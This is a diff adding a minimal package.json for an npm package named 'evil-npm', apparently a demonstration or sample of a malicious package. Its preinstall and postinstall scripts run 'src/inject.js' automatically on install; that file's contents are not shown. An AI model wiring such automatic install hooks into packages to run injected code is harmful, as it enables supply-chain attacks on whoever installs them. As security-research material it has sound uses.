@@ -1,0 +1,14 @@
+{
+  "name": "evil-npm",
+  "version": "1.0.0",
+  "description": "",
+  "main": "index.js",
+  "scripts": {
+    "test": "node src/test/index.test.js",
+    "preinstall": "node src/inject.js",
+    "postinstall": "node src/inject.js"
+  },
+  "keywords": [],
+  "author": "",
+  "license": "ISC"
+}
